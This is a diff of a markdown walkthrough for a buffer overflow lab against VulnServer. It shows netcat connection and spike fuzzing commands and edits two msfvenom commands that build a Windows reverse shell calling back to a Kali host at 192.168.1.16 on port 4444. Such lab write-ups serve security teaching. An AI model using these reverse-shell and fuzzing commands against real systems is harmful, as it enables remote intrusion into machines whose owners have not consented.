@@ -39,7 +39,7 @@ Get Windows IP address by opening CMD and running: ipconfig
 #### Kali Linux:
 use NetCat to connect
 ```
-# nc -nv <Winodw IP>
+# nc -nv <Winodw-IP>
 ```
 for this example you will see a prompt that says to use HELP for more info.
 use HELP to find out what commands are available and exit out. 
@@ -54,7 +54,7 @@ s_string_variable(“0”):
 ```
 
 ```
-# generic_send_tcp <Windows IP> <port#> stats.spk 0 0
+# generic_send_tcp <Windows-IP> <port#> stats.spk 0 0
 ```
 Check Immunity Debugger to see when it caused an error. 
 Each time an error is cause you will need to restart both VulnServer and Immunity Debugger as administrator, or you may have some issues. 
@@ -314,7 +314,9 @@ hit play and go back to Kali and run overflow.py, when you come back to Immunity
 ## Generating the Shell Code:
 
 #### Kali Linux:
-msfvenom -p windows/shell_reverse_tcp LHOST=\<Kali-IP\> LPORT=\<Kali-Port#\> EXITFUNC=thread -f c -a x86 -b “\x00”
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=<Kali-IP> LPORT=<Kali-Port#> EXITFUNC=thread -f c -a x86 -b “\x00”
+
 1. -p: payload; create a windows reverse shell
 2. LHOST=<Kali IP>; Listening Host
 3. LPORT=<Kali Port#>; 
@@ -322,8 +324,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=\<Kali-IP\> LPORT=\<Kali-Port#\> EXI
 5. -f: for file type; creating a C program 
 6. -a: architecture; creating for 32bit (x86)
 7. -b: for bad character; add in any characters you would like to exclude. 
-
-** Note: I had to change the command a little to get it to work for me, which is the command you see below. **
+```
+**Note: I had to change the command a little to get it to work for me, which is the command you see below.**
 ```
 msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.1.16 LPORT=4444 EXITFUNC=thread -f c -b '\x00'
 ```
